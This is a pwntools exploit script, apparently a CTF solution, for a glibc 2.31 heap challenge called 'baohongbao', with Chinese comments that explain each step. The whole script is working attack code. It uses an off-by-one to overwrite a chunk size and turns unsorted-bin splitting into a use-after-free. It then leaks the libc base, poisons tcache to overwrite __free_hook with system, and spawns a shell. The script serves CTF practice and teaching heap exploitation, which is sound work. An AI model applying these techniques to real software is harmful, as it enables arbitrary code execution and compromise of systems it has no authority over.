#本题为2.31版本的off by one，由于有了pre size和size的检查，
# 因此想要通过修改pre in use标志位来触发free时的合并较为困难
#因此本题使用off by one来修改下一个chunk(chunk1)的size位，
#从而在free时将chunk2也误认为是chunk1的一部分
#这样在add一个chunk1大小的chunk时触发unsorted bin切割，剩下的部分也就是chunk2被放入ubsorted bin
#从而形成UAF漏洞，进而unsortedbin attack泄露libc
#chunk2此时在堆中位于unsortedbin,但在程序中还是使用状态，因此再add一个chunk2大小的chunk时就会形成double free的效果
#进而利用double free来篡改free hook

#相似题目讲解：https://zhuanlan.zhihu.com/p/692866965
from pwn import*
p=process('./baohongbao')
# p=remote('ctf.npusec.org.cn',10052)
context.log_level='debug'
elf=ELF('./baohongbao')
libc=ELF('./libc-2.31.so')
def add(mount,index,content):
    p.sendlineafter('>> ','1')
    p.sendlineafter(b'How much do you plan to give the red envelope :',str(mount).encode())
    p.sendlineafter(b'index :',str(index).encode())
    p.sendlineafter(b'Write down your blessings on the red envelope :',content)

def delete(index):
    p.sendlineafter('>> ','2')
    p.sendlineafter(b'Which red envelope do you want to throw away :',str(index).encode())

def edit(index,content):
    p.sendlineafter('>> ','3')
    p.sendlineafter(b'Which red envelope do you want to modify :',str(index).encode())
    p.sendlineafter(b'Okay, let\'s rewrite our New Year\'s greetings :',content)

def show(index):
    p.sendlineafter('>> ','4')
    p.sendlineafter(b'Which red envelope do you want to check :',str(index).encode())

for i in range(7):
    add(0xa0,i,'a'*0xa0)
for i in range(7):
    delete(i)
#填满tcache

gdb.attach(p)
pause()
add(0x18,7,'a'*0x18)
add(0x18,8,'a'*0x18)
add(0x18,9,'a'*0x18)
add(0x80,10,'a'*0x80)
add(0x18,11,'a'*0x18)

payload=b'a'*0x18+b'\xb1'
edit(8,payload)
#off by one修改size位
delete(9)
add(0x18,12,'a'*0x18)
#造成unsorted bin切割进而形成UAF漏洞
show(10)
p.recvuntil(b'greetings :')
p.recvuntil(b'\n')
leak=u64(p.recv(6).ljust(8,b'\x00'))
print('leak:'+hex(leak))
libc_base=leak-0x1ecbe0
system_addr=libc_base+libc.sym['system']
print('libc_base:'+hex(libc_base))
print('system_addr:'+hex(system_addr))
binsh_addr=libc_base+next(libc.search(b'/bin/sh\x00'))
print('binsh_addr:'+hex(binsh_addr))
free_hook=libc_base+libc.sym['__free_hook']
print('free_hook:'+hex(free_hook))

add(0x80,13,'a'*0x80)
add(0x80,14,'a'*0x80)
delete(14)
#这里需要注意，tcache计数器为0时不能add，因此需要在利用前先在tcache中放置一个无用的chunk
delete(10)
payload=p64(free_hook)
edit(13,payload)
add(0x80,15,'a'*0x80)
add(0x80,16,p64(system_addr))
add(0x18,17,'/bin/sh\x00')
delete(17)

p.interactive()